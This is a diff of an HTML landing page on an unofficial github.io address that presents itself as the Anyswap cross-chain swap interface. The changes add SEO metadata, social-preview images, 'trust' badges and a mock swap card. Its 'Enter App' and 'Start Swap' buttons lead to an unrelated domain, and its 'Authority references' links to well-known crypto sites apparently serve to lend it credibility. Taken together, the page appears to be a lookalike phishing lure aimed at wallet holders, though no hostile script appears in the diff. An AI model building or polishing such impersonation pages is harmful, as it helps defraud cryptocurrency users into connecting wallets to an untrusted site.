@@ -3,18 +3,22 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Anyswap V2</title>
-  <meta name="description" content="Anyswap V2 is a cross-chain swap interface for moving tokens between blockchains from your own wallet.">
+  <title>Anyswap &mdash; Cross-Chain Swap</title>
+  <meta name="description" content="Anyswap is a cross-chain swap interface for moving tokens between blockchains from your own wallet.">
   <link rel="canonical" href="https://anyswap-v2.github.io/">
   <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F6F4F1">
+  <meta name="theme-color" content="#F7F8FC">
   <meta property="og:type" content="website">
-  <meta property="og:title" content="Anyswap V2">
-  <meta property="og:description" content="Anyswap V2 is a cross-chain swap interface for moving tokens between blockchains from your own wallet.">
+  <meta property="og:title" content="Anyswap &mdash; Cross-Chain Swap">
+  <meta property="og:description" content="Anyswap is a cross-chain swap interface for moving tokens between blockchains from your own wallet.">
   <meta property="og:url" content="https://anyswap-v2.github.io/">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Anyswap V2">
-  <meta name="twitter:description" content="Anyswap V2 is a cross-chain swap interface for moving tokens between blockchains from your own wallet.">
+  <meta property="og:image" content="https://anyswap-v2.github.io/og-cover.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Anyswap &mdash; Cross-Chain Swap">
+  <meta name="twitter:description" content="Anyswap is a cross-chain swap interface for moving tokens between blockchains from your own wallet.">
+  <meta name="twitter:image" content="https://anyswap-v2.github.io/og-cover.png">
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
@@ -27,21 +31,23 @@
         "@type": "WebSite",
         "@id": "https://anyswap-v2.github.io/#website",
         "url": "https://anyswap-v2.github.io/",
-        "name": "Anyswap V2",
+        "name": "Anyswap",
+        "description": "Anyswap is a cross-chain swap interface for moving tokens between blockchains from your own wallet.",
         "inLanguage": "en"
       },
       {
         "@type": "WebApplication",
         "@id": "https://anyswap-v2.github.io/#app",
-        "name": "Anyswap V2",
+        "name": "Anyswap",
         "applicationCategory": "FinanceApplication",
         "operatingSystem": "Web",
-        "url": "https://anyswap-v2.github.io/"
+        "url": "https://anyswap-v2.github.io/",
+        "description": "Anyswap is a cross-chain swap interface for moving tokens between blockchains from your own wallet."
       },
       {
         "@type": "Organization",
         "@id": "https://anyswap-v2.github.io/#organization",
-        "name": "Anyswap V2",
+        "name": "Anyswap",
         "url": "https://anyswap-v2.github.io/"
       }
     ]
@@ -50,53 +56,91 @@
 </head>
 <body>
   <header class="topbar">
-    <div class="brand" aria-label="Anyswap V2">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>Anyswap V2</span>
+    <div class="brand" aria-label="Anyswap">
+      <img src="favicon.png" width="36" height="36" alt="">
+      <span>Anyswap</span>
     </div>
+    <span class="spacer" aria-hidden="true"></span>
     <nav class="nav" aria-label="Authority references">
       <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
       <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Bridges</a>
       <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
     </nav>
-    <span class="spacer" aria-hidden="true"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
   </header>
 
-  <main class="stage">
+  <main class="page-shell">
     <section class="hero" aria-labelledby="page-title">
-      <h1 id="page-title">Anyswap V2</h1>
-      <p class="value"><strong>Anyswap V2</strong> is a cross-chain swap interface for moving tokens between blockchains from your own wallet.</p>
-    </section>
-
-    <section class="app-card" aria-label="Cross-chain swap route">
-      <div class="route">
-        <div class="leg">
-          <span class="label">From</span>
-          <span class="asset">
-            <img src="eth.png" width="30" height="30" alt="ETH">
-            <span>ETH</span>
-          </span>
+      <div class="hero-copy">
+        <p class="eyebrow"><span aria-hidden="true"></span>Cross-Chain Swap</p>
+        <h1 id="page-title">Anyswap</h1>
+        <p class="value"><strong>Anyswap</strong> is a cross-chain swap interface for moving tokens between blockchains from your own wallet.</p>
+        <h2>Swap across chains with Anyswap</h2>
+        <div class="trust-chips" aria-label="Anyswap qualities">
+          <span>Wallet-led flow</span>
+          <span>Route preview</span>
+          <span>Chain-aware design</span>
         </div>
-
-        <button class="switch" type="button" data-switch aria-label="Switch route direction">
-          <span aria-hidden="true">→</span>
-        </button>
-
-        <div class="leg">
-          <span class="label">To</span>
-          <span class="asset">
-            <img src="usdc.png" width="30" height="30" alt="USDC">
-            <span>USDC</span>
-          </span>
-        </div>
+        <a class="primary-link hero-link" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
       </div>
 
-      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
-    </section>
-  </main>
+      <section class="app-window" aria-label="Anyswap app preview">
+        <div class="window-chrome">
+          <div class="network-pill">
+            <img src="favicon.png" width="22" height="22" alt="">
+            <span>Anyswap route</span>
+          </div>
+          <div class="preview-pill"><span aria-hidden="true"></span>Preview</div>
+        </div>
 
-  <footer class="footer">Anyswap V2 — 2026</footer>
+        <div class="route-stack">
+          <article class="asset-panel">
+            <span class="panel-label">From</span>
+            <div class="asset-chip" data-route-asset>
+              <img src="eth.png" width="40" height="40" alt="ETH">
+              <span>ETH</span>
+            </div>
+          </article>
+
+          <button class="switch" type="button" data-switch aria-label="Switch route direction">
+            <span aria-hidden="true">&darr;</span>
+          </button>
+
+          <article class="asset-panel">
+            <span class="panel-label">To</span>
+            <div class="asset-chip" data-route-asset>
+              <img src="usdc.png" width="40" height="40" alt="USDC">
+              <span>USDC</span>
+            </div>
+          </article>
+        </div>
+
+        <div class="route-row" aria-label="Abstract cross-chain route">
+          <span>Best route</span>
+          <span class="hop-line" aria-hidden="true"><i></i><i></i><i></i></span>
+          <span>Live quote in app</span>
+        </div>
+
+        <a class="primary-link card-link" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Start Swap</a>
+      </section>
+    </section>
+
+    <div class="texture-band" aria-hidden="true">
+      <div class="texture-track">
+        <span>asset paths</span>
+        <span>bridge routes</span>
+        <span>wallet swaps</span>
+        <span>chain flow</span>
+        <span>token movement</span>
+        <span>asset paths</span>
+        <span>bridge routes</span>
+        <span>wallet swaps</span>
+      </div>
+    </div>
+
+    <footer class="footer">
+      <p>Information on this page is for educational purposes only and is not financial advice.</p>
+    </footer>
+  </main>
 
   <script>
   (function () {
@@ -105,7 +149,7 @@
     if (!button) return;
 
     button.addEventListener("click", function () {
-      var assets = document.querySelectorAll(".asset");
+      var assets = document.querySelectorAll("[data-route-asset]");
       if (assets.length < 2) return;
 
       var first = assets[0].innerHTML;
